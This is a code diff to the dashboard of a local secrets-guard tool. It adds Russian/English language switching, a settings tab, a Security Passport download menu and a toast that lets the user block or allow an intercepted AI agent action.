+          TabBtn("live", (currentLang === "ru" ? "Защита" : "Live protection") + (pending ? " (" + pending + ")" : ""), pending),
+          TabBtn("exposure", currentLang === "ru" ? "Порты" : "Ports"),
+          TabBtn("check", currentLang === "ru" ? "Проверка кода" : "Code Inspector"),
+          TabBtn("vault", currentLang === "ru" ? "Сейф" : "Vault"),
+          TabBtn("settings", currentLang === "ru" ? "⚙ Настройки" : "⚙ Settings")
+        ),
+        // Security Passport Dropdown
         h("div", { className: "yg-passport", style: { position: "relative", marginLeft: "auto" } },
-          h("button", { type: "button", className: "yg-btn ghost", disabled: !!passportBusy,
-            title: "Скачать сводный паспорт безопасности ПК (защита + порты + сейф + журнал) с подписью Proof Seal",
-            onClick: function () { setPassportOpen(!passportOpen); } },
-            passportBusy ? "… " + passportBusy : "⤓ Паспорт безопасности"),
-          passportOpen ? h("div", { className: "yg-vault-menu-dropdown", role: "menu",
-              style: { position: "absolute", right: 0, top: "100%", zIndex: 60, minWidth: "220px" } },
-            h("button", { type: "button", role: "menuitem", className: "yg-vault-menu-item",
-              onClick: function () { setPassportOpen(false); setPassportBusy("TXT");
-                buildPassport("txt", function () { setPassportBusy(""); }); } }, "⤓ Скачать TXT (с Proof Seal)"),
-            h("button", { type: "button", role: "menuitem", className: "yg-vault-menu-item",
-              onClick: function () { setPassportOpen(false); setPassportBusy("PDF");
-                buildPassport("pdf", function () { setPassportBusy(""); }); } }, "🖨 Открыть для печати / PDF")) : null)),
+          h("button", {
+            type: "button", className: "yg-btn ghost", disabled: !!passportBusy,
+            title: "Download Security Passport",
+            onClick: function () { setPassportOpen(!passportOpen); }
+          }, passportBusy ? "… " + passportBusy : (currentLang === "ru" ? "⤓ Паспорт безопасности" : "⤓ Security Passport")),
+          passportOpen ? h("div", {
+            className: "yg-vault-menu-dropdown", role: "menu",
+            style: { position: "absolute", right: 0, top: "100%", zIndex: 60, minWidth: "220px" }
+          },
+            h("button", {
+              type: "button", role: "menuitem", className: "yg-vault-menu-item",
+              onClick: function () {
+                setPassportOpen(false); setPassportBusy("TXT");
+                buildPassport("txt", function () { setPassportBusy(""); });
+              }
+            }, currentLang === "ru" ? "⤓ Скачать TXT (с Proof Seal)" : "⤓ Download TXT (Proof Seal)"),
+            h("button", {
+              type: "button", role: "menuitem", className: "yg-vault-menu-item",
+              onClick: function () {
+                setPassportOpen(false); setPassportBusy("PDF");
+                buildPassport("pdf", function () { setPassportBusy(""); });
+              }
+            }, currentLang === "ru" ? "🖨 Открыть для печати / PDF" : "🖨 Open Print / PDF")
+          ) : null),
+        // Language Switcher [ RU | EN ] in top right
+        h("div", { className: "yg-lang-switch", role: "group", "aria-label": "Language" },
+          h("button", {
+            type: "button", className: "yg-lang-btn" + (lang === "ru" ? " on" : ""),
+            onClick: function () { setLanguage("ru"); }
+          }, "RU"),
+          h("button", {
+            type: "button", className: "yg-lang-btn" + (lang === "en" ? " on" : ""),
+            onClick: function () { setLanguage("en"); }
+          }, "EN")
+        )
+      ),
+
+      // Tab Content View
       h("div", { className: "yg-grid" + (tab === "live" ? " live" : "") },
         tab === "live" ? h(LivePanel, { data: incidents, onChanged: refresh }) : null,
         tab === "exposure" ? h(ExposurePanel, null) : null,
         tab === "check" ? h(CheckPanel, null) : null,
-        tab === "vault" ? h(VaultPanel, { vault: vault, onChanged: refresh }) : null),
-      toast ? h(GuardToast, { inc: toast, count: pending, busy: toastBusy, note: toastNote,
-        onDecide: decide, onDismiss: promote, onOpen: function () { setTab("live"); promote(); } }) : null,
-      // The toast auto-dismisses; this pill keeps the unresolved count one click away.
-      !toast && pending ? h("button", { type: "button", className: "yg-toast-count", style: TOAST_COUNT,
-        title: "Show the blocked action", onClick: promote }, "⛔ " + pending + " blocked") : null,
-      h("div", { className: "yg-foot" }, "🔒 mcp-secrets-guard · всё работает на этом компьютере. Секреты маскируются; полное значение появляется, только пока удерживаете 👁, и каждый просмотр записывается в журнал."));
+        tab === "vault" ? h(VaultPanel, { vault: vault, onChanged: refresh }) : null,
+        tab === "settings" ? h(SettingsPanel, null) : null
+      ),
+
+      // Toast for backgrounded Hermes notifications
+      toast ? h(GuardToast, {
+        inc: toast, count: pending, busy: toastBusy, note: toastNote,
+        onDecide: decide, onDismiss: promote, onOpen: function () { setTab("live"); promote(); }
+      }) : null,
+
+      !toast && pending ? h("button", {
+        type: "button", className: "yg-toast-count",
+        style: { position: "fixed", bottom: 20, right: 20, zIndex: 9999, background: "var(--yg-bad)", color: "#fff", border: "none", borderRadius: 999, padding: "8px 16px", fontWeight: 700, cursor: "pointer", boxShadow: "0 4px 14px rgba(0,0,0,0.5)" },
+        title: "Show the blocked action", onClick: promote
+      }, "⛔ " + pending + " " + (currentLang === "ru" ? "заблокировано" : "blocked")) : null,
+
+      h("div", { className: "yg-foot" },
+        "🔒 mcp-secrets-guard · " + T("Everything runs on this computer. Secrets are masked; the full value appears only while you hold 👁, and every view is logged."))
+    );
+  }
+
+  function GuardToast(p) {
+    const inc = p.inc;
+    if (!inc) return null;
+    return h("div", {
+      className: "yg-card yg-toast",
+      style: { position: "fixed", bottom: 20, right: 20, zIndex: 9999, minWidth: 320, maxWidth: 420, boxShadow: "0 10px 40px rgba(0,0,0,0.85)", borderColor: "var(--yg-bad)" }
+    },
+      h("div", { style: { display: "flex", alignItems: "center", gap: 8, marginBottom: 6 } },
+        h("span", { style: { color: "var(--yg-bad)", fontWeight: 700 } }, "⛔ " + (currentLang === "ru" ? "Заблокировано действие агента" : "Agent Action Blocked")),
+        h("button", { type: "button", className: "yg-btn ghost yg-right", onClick: p.onDismiss }, "✕")),
+      h("div", { className: "yg-dim yg-small" }, (inc.tool || "") + " → " + (inc.destination || "")),
+      h("div", { className: "yg-actions", style: { marginTop: 8 } },
+        h("button", { className: "yg-btn bad", disabled: !!p.busy, onClick: function () { p.onDecide("block"); } }, currentLang === "ru" ? "Заблокировать" : "Block"),
+        h("button", { className: "yg-btn ghost", disabled: !!p.busy, onClick: function () { p.onDecide("allow"); } }, currentLang === "ru" ? "Разрешить" : "Allow"),
+        h("button", { className: "yg-btn ghost yg-right", onClick: p.onOpen }, currentLang === "ru" ? "В дашборд" : "Open Guard"))
+    );
   }
 
   onReady(GuardPage);
